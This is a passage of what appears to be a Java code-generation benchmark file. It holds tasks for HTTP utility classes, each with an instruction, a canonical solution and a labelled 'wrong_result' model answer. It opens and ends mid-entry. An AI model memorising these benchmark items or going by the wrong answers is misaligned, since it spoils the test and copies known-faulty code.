    XSTS_ERRORS.put(2148918296L, 2148918296);\n        XSTS_ERRORS.put(2148918297L, 2148918297);\n        XSTS_ERRORS.put(2148918298L, 2148918298);\n        XSTS_ERRORS.put(2148918299L, 2148918299);\n        XSTS_ERRORS.put(2148918300L, 2148918300);\n        XSTS_ERRORS.put(2148918301L, 2148918301);\n        XSTS_ERRORS.put(2148918302L, 2148918302);\n        XSTS_ERRORS.put(2148918303L, 2148918303);\n        XSTS_ERRORS.put(2148918304L, 2148918304);\n        XSTS_ERRORS.put(2148918305L, 2148918305);\n        XSTS_ERRORS.put(2148918306L, 2148918306);\n        XSTS_ERRORS.put(2148918307L, 2148918307);\n        XSTS_ERRORS.put("
  },
  {
    "Task_id": 73,
    "Instruction": "Task Description: Create a Java utility class for handling HTTP requests and URL parameter parsing.\n\nClass Description: HttpUtils is a utility class that provides methods for making HTTP POST requests and parsing URL parameters. It uses Java's HttpURLConnection for HTTP communication and includes helper methods for processing request/response data.\n\nAttributes: (This class has no attributes as it's a utility class with static methods only)\n\nMethods:\n\nMethod1: parseUrlArgs(String responseUrl, JsonObject jsonObject) -> String - Parses a URL string to extract query parameters and adds them to a JsonObject. Returns the base URL without query parameters.\n- Input Parameters:\n  - responseUrl: String - The URL string to parse (may contain query parameters)\n  - jsonObject: JsonObject - The JSON object to populate with parsed parameters\n- Output: String - The base URL without query parameters\n\nMethod2: post(String httpUrl, String content) -> String - Sends an HTTP POST request to the specified URL with the given content and returns the response.\n- Input Parameters:\n  - httpUrl: String - The target URL for the POST request\n  - content: String - The content to send in the request body (can be null or empty)\n- Output: String - The response body from the server\n- Throws: Exception - If the request fails or returns non-200 status code",
    "Canonical_solution": "import com.google.common.io.CharStreams;\nimport com.google.gson.JsonObject;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.nio.charset.StandardCharsets;\nimport java.util.HashMap;\nimport java.util.Map;\nimport java.util.Map.Entry;\nimport org.apache.commons.lang3.StringUtils;\n\npublic class HttpUtils {\n\n    public static String parseUrlArgs(String responseUrl, JsonObject jsonObject) {\n        String[] split1 = responseUrl.split(\"\\\\?\");\n        String url = split1[0];\n        if (split1.length > 1) {\n            String[] split = split1[1].split(\"&\");\n            for (int i = 0; i < split.length; i++) {\n                String[] args = split[i].split(\"=\");\n                jsonObject.addProperty(args[0], args[1]);\n            }\n        }\n        return url;\n    }\n\n    public static String post(String httpUrl, String content) throws Exception {\n        Map<String, String> headers = new HashMap<>(1);\n        headers.put(\"Content-type\", \"application/json\");\n        URL url = new URL(httpUrl);\n        HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n        conn.setRequestMethod(\"POST\");\n        conn.setDoOutput(true);\n        if (null != headers && !headers.isEmpty()) {\n            for (Entry<String, String> entry : headers.entrySet()) {\n                conn.setRequestProperty(entry.getKey(), entry.getValue());\n            }\n        }\n        if (StringUtils.isNotBlank(content)) {\n            conn.getOutputStream().write(content.getBytes(StandardCharsets.UTF_8));\n        }\n        conn.connect();\n        if (conn.getResponseCode() != HttpURLConnection.HTTP_OK) {\n            throw new RuntimeException(\"request failure, status code:\" + conn.getResponseCode());\n        }\n        String result = CharStreams\n            .toString(new InputStreamReader(conn.getInputStream(), StandardCharsets.UTF_8));\n        conn.disconnect();\n        return result;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "public class HttpUtils {\n    public static String parseUrlArgs(String responseUrl, JsonObject jsonObject) {\n        String baseUrl = responseUrl;\n        int questionIndex = responseUrl.indexOf('?');\n        if (questionIndex != -1) {\n            String queryParams = responseUrl.substring(questionIndex + 1);\n            String[] pairs = queryParams.split(\"&\");\n            for (String pair : pairs) {\n                String[] keyValue = pair.split(\"=\");\n                if (keyValue.length == 2) {\n                    String key = keyValue[0];\n                    String value = keyValue[1];\n                    jsonObject.addProperty(key, value);\n                }\n            }\n            baseUrl = responseUrl.substring(0, questionIndex);\n        }\n        return baseUrl;\n    }\n\n    public static String post(String httpUrl, String content) throws Exception {\n        URL url = new URL(httpUrl);\n        HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n        conn.setRequestMethod(\"POST\");\n        conn.setDoOutput(true);\n        conn.setRequestProperty(\"Content-Type\", \"application/x-www-form-urlencoded\");\n\n        if (content != null && !content.isEmpty()) {\n            try (OutputStream os = conn.getOutputStream()) {\n                byte[] input = content.getBytes(\"utf-8\");\n                os.write(input, 0, input.length);\n            }\n        }\n\n        int responseCode = conn.getResponseCode();\n        if (responseCode != HttpURLConnection.HTTP_OK) {\n            throw new Exception(\"HTTP request failed with code: \" + responseCode);\n        }\n\n        try (BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream(), \"utf-8\"))) {\n            StringBuilder response = new StringBuilder();\n            String responseLine;\n            while ((responseLine = br.readLine()) != null) {\n                response.append(responseLine.trim());\n            }\n            return response.toString();\n        }\n    }\n}"
  },
  {
    "Task_id": 74,
    "Instruction": "Task Description: Create a Java utility class for handling HTTPS network requests, including downloading content as strings or files.\n\nClass Description: NetworkUtils is a utility class that provides methods for making HTTPS requests and downloading content either as strings or files. It handles connection setup, timeout configuration, and proper resource cleanup.\n\nAttributes:\nDEBUG: [boolean] - Flag to enable debug logging\nTAG: [String] - Tag used for logging\nHTTP_READ_TIMEOUT: [int] - Timeout for reading from connection (in milliseconds)\nHTTP_CONNECTION_TIMEOUT: [int] - Timeout for establishing connection (in milliseconds)\n\nMethods:\nsetupHttpsRequest: [String urlStr] -> [HttpsURLConnection] - Sets up an HTTPS connection with the specified URL, configures timeouts and request method, and establishes the connection. Returns the connection object if successful.\ndownloadUrlMemoryAsString: [String url] -> [String] - Downloads content from the specified URL and returns it as a UTF-8 encoded string. Returns null if the download fails.\ndownloadUrlFile: [String url, File f] -> [boolean] - Downloads content from the specified URL and saves it to the specified file. Returns true if successful, false otherwise.\nDownloadCallback: [interface] - Interface defining a callback for asynchronous download completion with onDownloadComplete method.",
    "Canonical_solution": "import android.util.Log;\nimport java.io.ByteArrayOutputStream;\nimport java.io.File;\nimport java.io.FileOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.net.URL;\nimport java.nio.charset.StandardCharsets;\nimport javax.net.ssl.HttpsURLConnection;\n\npublic class NetworkUtils {\n\n    private static final boolean DEBUG = false;\n    private static final String TAG = \"NetworkUtils\";\n    private static final int HTTP_READ_TIMEOUT = 60000;\n    private static final int HTTP_CONNECTION_TIMEOUT = 60000;\n\n    public static HttpsURLConnection setupHttpsRequest(String urlStr) {\n        URL url;\n        HttpsURLConnection urlConnection = null;\n        try {\n            url = new URL(urlStr);\n            urlConnection = (HttpsURLConnection) url.openConnection();\n            urlConnection.setConnectTimeout(HTTP_CONNECTION_TIMEOUT);\n            urlConnection.setReadTimeout(HTTP_READ_TIMEOUT);\n            urlConnection.setRequestMethod(\"GET\");\n            urlConnection.setDoInput(true);\n            urlConnection.connect();\n            int code = urlConnection.getResponseCode();\n            if (code != HttpsURLConnection.HTTP_OK) {\n                Log.d(TAG, \"response:\" + code);\n                return null;\n            }\n            return urlConnection;\n        } catch (Exception e) {\n            Log.e(TAG, \"Failed to connect to server\", e);\n            return null;\n        }\n    }\n\n    public static String downloadUrlMemoryAsString(String url) {\n        if (DEBUG) Log.d(TAG, \"download: \" + url);\n\n        HttpsURLConnection urlConnection = null;\n        try {\n            urlConnection = setupHttpsRequest(url);\n            if (urlConnection == null) {\n                return null;\n            }\n\n            InputStream is = urlConnection.getInputStream();\n            ByteArrayOutputStream byteArray = new ByteArrayOutputStream();\n            int byteInt;\n\n            while ((byteInt = is.read()) >= 0) {\n                byteArray.write(byteInt);\n            }\n\n            byte[] bytes = byteArray.toByteArray();\n            if (bytes == null) {\n                return null;\n            }\n\n            return new String(bytes, StandardCharsets.UTF_8);\n        } catch (Exception e) {\n            Log.e(TAG, \"\", e);\n            return null;\n        } finally {\n            if (urlConnection != null) {\n                urlConnection.disconnect();\n            }\n        }\n    }\n\n    public static boolean downloadUrlFile(String url, File f) {\n        if (DEBUG) Log.d(TAG, \"download:\" + url);\n\n        HttpsURLConnection urlConnection = null;\n\n        if (f.exists())\n            f.delete();\n\n        try {\n            urlConnection = setupHttpsRequest(url);\n            if (urlConnection == null) {\n                return false;\n            }\n            long len = urlConnection.getContentLength();\n            if ((len > 0) && (len < 4L * 1024L * 1024L * 1024L)) {\n                byte[] buffer = new byte[262144];\n\n                InputStream is = urlConnection.getInputStream();\n                FileOutputStream os = new FileOutputStream(f, false);\n                try {\n                    int r;\n                    while ((r = is.read(buffer)) > 0) {\n                        os.write(buffer, 0, r);\n                    }\n                } finally {\n                    os.close();\n                }\n\n                return true;\n            }\n            return false;\n        } catch (Exception e) {\n            Log.e(TAG, \"\", e);\n            return false;\n        } finally {\n            if (urlConnection != null) {\n                urlConnection.disconnect();\n            }\n        }\n    }\n\n    public interface DownloadCallback {\n        void onDownloadComplete(String result);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "public class NetworkUtils {\n    public static final boolean DEBUG = true;\n    public static final String TAG = \"NetworkUtils\";\n    public static final int HTTP_READ_TIMEOUT = 10000;\n    public static final int HTTP_CONNECTION_TIMEOUT = 5000;\n\n    public static HttpsURLConnection setupHttpsRequest(String urlStr) {\n        try {\n            URL url = new URL(urlStr);\n            HttpsURLConnection connection = (HttpsURLConnection) url.openConnection();\n            connection.setRequestMethod(\"GET\");\n            connection.setConnectTimeout(HTTP_CONNECTION_TIMEOUT);\n            connection.setReadTimeout(HTTP_READ_TIMEOUT);\n            connection.setUseCaches(false);\n            connection.connect();\n            return connection;\n        } catch (Exception e) {\n            if (DEBUG) {\n                System.err.println(TAG + \": Error setting up HTTPS request - \" + e.getMessage());\n            }\n            return null;\n        }\n    }\n\n    public static String downloadUrlMemoryAsString(String url) {\n        HttpsURLConnection connection = setupHttpsRequest(url);\n        if (connection == null) {\n            return null;\n        }\n        try {\n            int responseCode = connection.getResponseCode();\n            if (responseCode == HttpsURLConnection.HTTP_OK) {\n                BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream(), \"UTF-8\"));\n                StringBuilder result = new StringBuilder();\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    result.append(line);\n                }\n                reader.close();\n                return result.toString();\n            } else {\n                if (DEBUG) {\n                    System.err.println(TAG + \": Download failed with response code: \" + responseCode);\n                }\n                return null;\n            }\n        } catch (Exception e) {\n            if (DEBUG) {\n                System.err.println(TAG + \": Error downloading URL as string - \" + e.getMessage());\n            }\n            return null;\n        } finally {\n            if (connection != null) {\n                connection.disconnect();\n            }\n        }\n    }\n\n    public static boolean downloadUrlFile(String url, File f) {\n        HttpsURLConnection connection = setupHttpsRequest(url);\n        if (connection == null || f == null) {\n            return false;\n        }\n        try {\n            int responseCode = connection.getResponseCode();\n            if (responseCode == HttpsURLConnection.HTTP_OK) {\n                InputStream inputStream = connection.getInputStream();\n                FileOutputStream fileOutputStream = new FileOutputStream(f);\n                byte[] buffer = new byte[4096];\n                int bytesRead;\n                while ((bytesRead = inputStream.read(buffer)) != -1) {\n                    fileOutputStream.write(buffer, 0, bytesRead);\n                }\n                fileOutputStream.close();\n                inputStream.close();\n                return true;\n            } else {\n                if (DEBUG) {\n                    System.err.println(TAG + \": Download failed with response code: \" + responseCode);\n                }\n                return false;\n            }\n        } catch (Exception e) {\n            if (DEBUG) {\n                System.err.println(TAG + \": Error downloading URL to file - \" + e.getMessage());\n            }\n            return false;\n        } finally {\n            if (connection != null) {\n                connection.disconnect();\n            }\n        }\n    }\n\n    public interface DownloadCallback {\n        void onDownloadComplete(boolean success, String url, Object data);\n    }\n}"
  },
  {
    "Task_id": 75,
    "Instruction": "Task Description: Create a function that retrieves JSON data from a Twitter URL based on a given tweet ID using Java's HttpURLConnection.\n\nFunction Description: The function makes an HTTP GET request to a Twitter URL constructed with the provided tweet ID, reads the response, and returns it as a JSONObject. It handles HTTPS connections, sets appropriate request headers, and manages the connection lifecycle.\n\nInput: \n- tweetId: long - The ID of the tweet for which to retrieve favorited popup data\n\nOutput: \n- JSONObject - The JSON response from the Twitter URL, or null if an error occurs",
    "Canonical_solution": "import javax.net.ssl.HttpsURLConnection;\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.net.URL;\n\npublic JSONObject getJson(long tweetId) {\n    try {\n        String url = \"https://twitter.com/i/activity/favorited_popup?id=\" + tweetId;\n        URL obj = new URL(url);\n\n        HttpsURLConnection connection = (HttpsURLConnection) obj.openConnection();\n        connection.setRequestProperty(\"Content-Type\", \"text/html\");\n        connection.setRequestProperty(\"charset\", \"utf-8\");\n        connection.setRequestMethod(\"GET\");\n        connection.setRequestProperty(\"user-agent\", \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.94 Safari/537.36\");\n        connection.connect();\n\n        BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));\n        StringBuilder sb = new StringBuilder();\n        String line = null;\n        while ((line = reader.readLine()) != null) {\n            sb.append(line + \"\\n\");\n        }\n\n        String docHtml = sb.toString();\n\n        try {\n            connection.disconnect();\n        } catch (Exception e) {\n\n        }\n\n        return new JSONObject(docHtml);\n    } catch (Exception e) {\n        return null;\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 16,
    "wrong_result": "{\n  \"function\": \"public static JSONObject getTweetData(long tweetId) {\\n    try {\\n        String url = \\\"https://twitter.com/i/status/\\\" + tweetId;\\n        URL obj = new URL(url);\\n        HttpURLConnection con = (HttpURLConnection) obj.openConnection();\\n        con.setRequestMethod(\\\"GET\\\");\\n        con.setRequestProperty(\\\"User-Agent\\\", \\\"Mozilla/5.0\\\");\\n        int responseCode = con.getResponseCode();\\n        if (responseCode == HttpURLConnection.HTTP_OK) {\\n            BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));\\n            String inputLine;\\n            StringBuilder response = new StringBuilder();\\n            while ((inputLine = in.readLine()) != null) {\\n                response.append(inputLine);\\n            }\\n            in.close();\\n            return new JSONObject(response.toString());\\n        } else {\\n            return null;\\n        }\\n    } catch (Exception e) {\\n        e.printStackTrace();\\n        return null;\\n    }\\n}\"\n}"
  },
  {
    "Task_id": 76,
    "Instruction": "Task Description: Create a Java class that implements an HTTP client for MMS (Multimedia Messaging Service) operations, supporting both HTTP and HTTPS protocols with configurable proxy settings and connection parameters.\n\nClass Description: MmsHttpClient is a specialized HTTP client designed for MMS operations that handles both GET and POST requests. It manages network connections, proxy configurations, request/response handling, and includes MMS-specific header management. The class uses OkHttp internally for connection management.\n\nAttributes:\n- mContext: Context - Android application context\n- mSocketFactory: SocketFactory - Factory for creating sockets\n- mHostResolver: MmsNetworkManager - Network host resolver for connection management\n- mConnectionPool: ConnectionPool - Pool of HTTP connections for reuse\n\nMethods:\n- execute(String urlString, byte[] pdu, String method, boolean isProxySet, String proxyHost, int proxyPort, MmsConfig.Overridden mmsConfig) -> byte[] - Executes an HTTP request to the specified URL with given PDU data. Handles both GET and POST methods with proxy support. Returns the response body as byte array.\n- openConnection(URL url, Proxy proxy) -> HttpURLConnection - Creates and configures an appropriate HttpURLConnection (HTTP or HTTPS) with the given URL and proxy settings. Throws MalformedURLException for invalid protocols.\n- checkMethod(String method) -> void - Validates that the HTTP method is either GET or POST (helper method)\n- getCurrentAcceptLanguage(Locale locale) -> String - Generates Accept-Language header value from locale (helper method)\n- addExtraHeaders(HttpURLConnection connection, MmsConfig.Overridden mmsConfig) -> void - Adds additional MMS-specific headers to the request (helper method)\n- logHttpHeaders(Map<String, List<String>> headers) -> void - Logs HTTP headers for debugging (helper method)",
    "Canonical_solution": "import android.content.Context;\nimport com.android.mms.service_alt.exception.MmsHttpException;\nimport com.squareup.okhttp.ConnectionPool;\nimport com.squareup.okhttp.ConnectionSpec;\nimport com.squareup.okhttp.OkHttpClient;\nimport com.squareup.okhttp.Protocol;\nimport com.squareup.okhttp.Request;\nimport com.squareup.okhttp.Response;\nimport com.squareup.okhttp.internal.Internal;\nimport com.squareup.okhttp.internal.huc.HttpURLConnectionImpl;\nimport com.squareup.okhttp.internal.huc.HttpsURLConnectionImpl;\nimport timber.log.Timber;\n\nimport javax.net.SocketFactory;\nimport javax.net.ssl.HostnameVerifier;\nimport javax.net.ssl.HttpsURLConnection;\nimport java.io.BufferedInputStream;\nimport java.io.BufferedOutputStream;\nimport java.io.ByteArrayOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.HttpURLConnection;\nimport java.net.InetSocketAddress;\nimport java.net.MalformedURLException;\nimport java.net.ProtocolException;\nimport java.net.Proxy;\nimport java.net.ProxySelector;\nimport java.net.SocketAddress;\nimport java.net.URI;\nimport java.net.URL;\nimport java.util.ArrayList;\nimport java.util.Arrays;\nimport java.util.List;\nimport java.util.Locale;\nimport java.util.Map;\nimport java.util.regex.Matcher;\nimport java.util.regex.Pattern;\n\npublic class MmsHttpClient {\n\n    public static final String METHOD_POST = \"POST\";\n    public static final String METHOD_GET = \"GET\";\n\n    private static final String HEADER_CONTENT_TYPE = \"Content-Type\";\n    private static final String HEADER_ACCEPT = \"Accept\";\n    private static final String HEADER_ACCEPT_LANGUAGE = \"Accept-Language\";\n    private static final String HEADER_USER_AGENT = \"User-Agent\";\n\n    private static final String HEADER_VALUE_ACCEPT =\n            \"*/*, application/vnd.wap.mms-message, application/vnd.wap.sic\";\n    private static final String HEADER_VALUE_CONTENT_TYPE_WITH_CHARSET =\n            \"application/vnd.wap.mms-message; charset=utf-8\";\n    private static final String HEADER_VALUE_CONTENT_TYPE_WITHOUT_CHARSET =\n            \"application/vnd.wap.mms-message\";\n\n    private final Context mContext;\n    private final SocketFactory mSocketFactory;\n    private final MmsNetworkManager mHostResolver;\n    private final ConnectionPool mConnectionPool;\n\n    public MmsHttpClient(Context context, SocketFactory socketFactory, MmsNetworkManager hostResolver,\n            ConnectionPool connectionPool) {\n        mContext = context;\n        mSocketFactory = socketFactory;\n        mHostResolver = hostResolver;\n        mConnectionPool = connectionPool;\n    }\n\n    public byte[] execute(String urlString, byte[] pdu, String method, boolean isProxySet,\n            String proxyHost, int proxyPort, MmsConfig.Overridden mmsConfig)\n            throws MmsHttpException {\n        Timber.d(\"HTTP: \" + method + \" \" + urlString\n                + (isProxySet ? (\", proxy=\" + proxyHost + \":\" + proxyPort) : \"\")\n                + \", PDU size=\" + (pdu != null ? pdu.length : 0));\n        checkMethod(method);\n        HttpURLConnection connection = null;\n        try {\n            Proxy proxy = null;\n            if (isProxySet) {\n                proxy = new Proxy(Proxy.Type.HTTP, new InetSocketAddress(proxyHost, proxyPort));\n            }\n            final URL url = new URL(urlString);\n            connection = openConnection(url, proxy);\n            connection.setDoInput(true);\n            connection.setConnectTimeout(mmsConfig.getHttpSocketTimeout());\n            connection.setRequestProperty(HEADER_ACCEPT, HEADER_VALUE_ACCEPT);\n            connection.setRequestProperty(\n                    HEADER_ACCEPT_LANGUAGE, getCurrentAcceptLanguage(Locale.getDefault()));\n            final String userAgent = mmsConfig.getUserAgent();\n            Timber.i(\"HTTP: User-Agent=\" + userAgent);\n            connection.setRequestProperty(HEADER_USER_AGENT, userAgent);\n            final String uaProfUrlTagName = mmsConfig.getUaProfTagName();\n            final String uaProfUrl = mmsConfig.getUaProfUrl();\n            if (uaProfUrl != null) {\n                Timber.i(\"HTTP: UaProfUrl=\" + uaProfUrl);\n                connection.setRequestProperty(uaProfUrlTagName, uaProfUrl);\n            }\n            addExtraHeaders(connection, mmsConfig);\n            if (METHOD_POST.equals(method)) {\n                if (pdu == null || pdu.length < 1) {\n                    Timber.e(\"HTTP: empty pdu\");\n                    throw new MmsHttpException(0/*statusCode*/, \"Sending empty PDU\");\n                }\n                connection.setDoOutput(true);\n                connection.setRequestMethod(METHOD_POST);\n                if (mmsConfig.getSupportHttpCharsetHeader()) {\n                    connection.setRequestProperty(HEADER_CONTENT_TYPE,\n                            HEADER_VALUE_CONTENT_TYPE_WITH_CHARSET);\n                } else {\n                    connection.setRequestProperty(HEADER_CONTENT_TYPE,\n                            HEADER_VALUE_CONTENT_TYPE_WITHOUT_CHARSET);\n                }\n                logHttpHeaders(connection.getRequestProperties());\n                connection.setFixedLengthStreamingMode(pdu.length);\n                final OutputStream out = new BufferedOutputStream(connection.getOutputStream());\n                out.write(pdu);\n                out.flush();\n                out.close();\n            } else if (METHOD_GET.equals(method)) {\n                logHttpHeaders(connection.getRequestProperties());\n                connection.setRequestMethod(METHOD_GET);\n            }\n            final int responseCode = connection.getResponseCode();\n            final String responseMessage = connection.getResponseMessage();\n            Timber.d(\"HTTP: \" + responseCode + \" \" + responseMessage);\n            logHttpHeaders(connection.getHeaderFields());\n            if (responseCode / 100 != 2) {\n                throw new MmsHttpException(responseCode, responseMessage);\n            }\n            final InputStream in = new BufferedInputStream(connection.getInputStream());\n            final ByteArrayOutputStream byteOut = new ByteArrayOutputStream();\n            final byte[] buf = new byte[4096];\n            int count = 0;\n            while ((count = in.read(buf)) > 0) {\n                byteOut.write(buf, 0, count);\n            }\n            in.close();\n            final byte[] responseBody = byteOut.toByteArray();\n            Timber.d(\"HTTP: response size=\"\n                    + (responseBody != null ? responseBody.length : 0));\n            return responseBody;\n        } catch (MalformedURLException e) {\n            Timber.e(e, \"HTTP: invalid URL \" + urlString);\n            throw new MmsHttpException(0/*statusCode*/, \"Invalid URL \" + urlString, e);\n        } catch (ProtocolException e) {\n            Timber.e(e, \"HTTP: invalid URL protocol \" + urlString);\n            throw new MmsHttpException(0/*statusCode*/, \"Invalid URL protocol \" + urlString, e);\n        } catch (IOException e) {\n            Timber.e(e, \"HTTP: IO failure\");\n            throw new MmsHttpException(0/*statusCode*/, e);\n        } finally {\n            if (connection != null) {\n                connection.disconnect();\n            }\n        }\n    }\n\n    private HttpURLConnection openConnection(URL url, final Proxy proxy) throws MalformedURLException {\n        final String protocol = url.getProtocol();\n        OkHttpClient okHttpClient;\n        if (protocol.equals(\"http\")) {\n            okHttpClient = new OkHttpClient();\n            okHttpClient.setFollowRedirects(false);\n            okHttpClient.setProtocols(Arrays.asList(Protocol.HTTP_1_1));\n            okHttpClient.setProxySelector(new ProxySelector() {\n                @Override\n                public List<Proxy> select(URI uri) {\n                    if (proxy != null) {\n                        return Arrays.asList(proxy);\n                    } else {\n                        return new ArrayList<Proxy>();\n                    }\n                }\n\n                @Override\n                public void connectFailed(URI uri, SocketAddress address, IOException failure) {\n                }\n            });\n            okHttpClient.setAuthenticator(new com.squareup.okhttp.Authenticator() {\n                @Override\n                public Request authenticate(Proxy proxy, Response response) throws IOException {\n                    return null;\n                }\n\n                @Override\n                public Request authenticateProxy(Proxy proxy, Response response) throws IOException {\n                    return null;\n                }\n            });\n            okHttpClient.setConnectionSpecs(Arrays.asList(ConnectionSpec.CLEARTEXT));\n            okHttpClient.setConnectionPool(new ConnectionPool(3, 60000));\n            okHttpClient.setSocketFactory(SocketFactory.getDefault());\n            Internal.instance.setNetwork(okHttpClient, mHostResolver);\n\n            if (proxy != null) {\n                okHttpClient.setProxy(proxy);\n            }\n\n            return new HttpURLConnectionImpl(url, okHttpClient);\n        } else if (protocol.equals(\"https\")) {\n            okHttpClient = new OkHttpClient();\n            okHttpClient.setProtocols(Arrays.asList(Protocol.HTTP_1_1));\n            HostnameVerifier verifier = HttpsURLConnection.getDefaultHostnameVerifier();\n            okHttpClient.setHostnameVerifier(verifier);\n            okHttpClient.setSslSocketFactory(HttpsURLConnection.getDefaultSSLSocketFactory());\n            okHttpClient.setProxySelector(new ProxySelector() {\n                @Override\n                public List<Proxy> select(URI uri) {\n                    return Arrays.asList(proxy);\n                }\n\n                @Override\n                public void connectFailed(URI uri, SocketAddress address, IOException failure) {\n                }\n            });\n            okHttpClient.setAuthenticator(new com.squareup.okhttp.Authenticator() {\n                @Override\n                public Request authenticate(Proxy proxy, Response response) throws IOException {\n                    return null;\n                }\n\n                @Override\n                public Request authenticateProxy(Proxy proxy, Response response) throws IOException {\n                    return null;\n                }\n            });\n            okHttpClient.setConnectionSpecs(Arrays.asList(ConnectionSpec.CLEARTEXT));\n            okHttpClient.setConnectionPool(new ConnectionPool(3, 60000));\n            Internal.instance.setNetwork(okHttpClient, mHostResolver);\n\n            return new HttpsURLConnectionImpl(url, okHttpClient);\n        } else {\n            throw new MalformedURLException(\"Invalid URL or unrecognized protocol \" + protocol);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "```java\nimport android.content.Context;\nimport java.io.ByteArrayOutputStream;\nimport java.io.IOException;\nimport java.net.HttpURLConnection;\nimport java.net.MalformedURLException;\nimport java.net.Proxy;\nimport java.net.URL;\nimport java.util.Locale;\nimport java.util.Map;\nimport java.util.List;\nimport java.util.HashMap;\nimport okhttp3.OkHttpClient;\nimport okhttp3.Request;\nimport okhttp3.Response;\n\npublic class MmsHttpClient {\n    private Context mContext;\n    private SocketFactory mSocketFactory;\n    private MmsNetworkManager mHostResolver;\n    private ConnectionPool mConnectionPool;\n\n    public MmsHttpClient(Context context, SocketFactory socketFactory, MmsNetworkManager hostResolver, ConnectionPool connectionPool) {\n        this.mContext = context;\n        this.mSocketFactory = socketFactory;\n        this.mHostResolver = hostResolver;\n        this.mConnectionPool = connectionPool;\n    }\n\n    public byte[] execute(String urlString, byte[] pdu, String method, boolean isProxySet, String proxyHost, int proxyPort, MmsConfig.Overridden mmsConfig) throws IOException {\n        URL url = new URL(urlString);\n        Proxy proxy = isProxySet ? new Proxy(Proxy.Type.HTTP, new java.net.InetSocketAddress(proxyHost, proxyPort)) : Proxy.NO_PROXY;\n        HttpURLConnection connection = openConnection(url, proxy);\n        addExtraHeaders(connection, mmsConfig);\n        checkMethod(method);\n        if (method.equals(\"POST\")) {\n            connection.setRequestMethod(\"POST\");\n            connection.setDoOutput(true);\n            connection.getOutputStream().write(pdu);\n        } else {\n            connection.setRequestMethod(\"GET\");\n        }\n        int responseCode = connection.getResponseCode();\n        if (responseCode == HttpURLConnection.HTTP_OK) {\n            ByteArrayOutputStream buffer = new ByteArrayOutputStream();\n            byte[] data = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = connection.getInputStream().read(data, 0, data.length)) != -1) {\n                buffer.write(data, 0, bytesRead);\n            }\n            return buffer.toByteArray();\n        } else {\n            throw new IOException(\"HTTP request failed with code: \" + responseCode);\n        }\n    }\n\n    private HttpURLConnection openConnection(URL url, Proxy proxy) throws MalformedURLException {\n        if (url.getProtocol().equals(\"https\")) {\n            return (HttpsURLConnection) url.openConnection(proxy);\n        } else {\n            return (HttpURLConnection) url.openConnection(proxy);\n        }\n    }\n\n    private void checkMethod(String method) {\n        if (!method.equals(\"GET\") && !method.equals(\"POST\")) {\n            throw new IllegalArgumentException(\"Unsupported HTTP method: \" + method);\n        }\n    }\n\n    private String getCurrentAcceptLanguage(Locale locale) {\n        return locale.toString();\n    }\n\n    private void addExtraHeaders(HttpURLConnection connection, MmsConfig.Overridden mmsConfig) {\n        Map<String, List<String>> headers = new HashMap<>();\n        headers.put(\"Accept-Language\", List.of(getCurrentAcceptLanguage(Locale.getDefault())));\n        headers.put(\"Content-Type\", List.of(\"application/vnd.wap.mms-message\"));\n        logHttpHeaders(headers);\n    }\n\n    private void logHttpHeaders(Map<String, List<String>> headers) {\n        for (Map.Entry<String, List<String>> entry : headers.entrySet()) {\n            System.out.println(entry.getKey() + \": \" + String.join(\", \", entry.getValue()));\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 77,
    "Instruction": "Task Description: Create a Java class that handles HTTP POST requests to a specified URL, with callback functionality for success and failure cases.\n\nClass Description: The HttpRequestHandler class is responsible for sending HTTP POST requests to a predefined URL. It encapsulates the connection setup, request parameter encoding, and response handling, providing callback methods to notify the caller of the request outcome.\n\nAttributes:\n- packageName: String - The package name to be sent as a parameter in the POST request\n- callback: OnRequestCallback - The callback interface to handle request success or failure\n\nMethods:\n- sendPostRequest(): void - Sends a POST request to the configured URL with the packageName as a parameter. Handles connection setup, timeout configuration, request writing, and response processing. Notifies the callback of success or failure.\n- HttpRequestHandler(String, OnRequestCallback): Constructor - Initializes the handler with a package name and callback interface\n\nInterface:\n- OnRequestCallback: Interface defining callback methods for request outcomes\n  - onSuccess(): void - Called when the request succeeds (response code < 400)\n  - onFailure(Exception): void - Called when the request fails (response code >= 400 or IO exception occurs)",
    "Canonical_solution": "import java.io.BufferedWriter;\nimport java.io.IOException;\nimport java.io.OutputStream;\nimport java.io.OutputStreamWriter;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.net.URLEncoder;\n\npublic class HttpRequestHandler {\n\n    private String packageName;\n    private OnRequestCallback callback;\n\n    public HttpRequestHandler(String packageName, OnRequestCallback callback) {\n        this.packageName = packageName;\n        this.callback = callback;\n    }\n\n    public void sendPostRequest() {\n        try {\n            URL url = new URL(\"https://www.freelinebuild.com/api/feedback/app\");\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setReadTimeout(10000);\n            conn.setConnectTimeout(15000);\n            conn.setRequestMethod(\"POST\");\n            conn.setDoInput(true);\n            conn.setDoOutput(true);\n\n            StringBuilder builder = new StringBuilder();\n            builder.append(URLEncoder.encode(\"pkg\", \"UTF-8\"));\n            builder.append(\"=\");\n            builder.append(URLEncoder.encode(packageName, \"UTF-8\"));\n\n            OutputStream os = conn.getOutputStream();\n            BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(os, \"UTF-8\"));\n            writer.write(builder.toString());\n            writer.flush();\n            writer.close();\n            os.close();\n\n            int responseCode = conn.getResponseCode();\n            if (responseCode >= 400) {\n                this.callback.onFailure(new 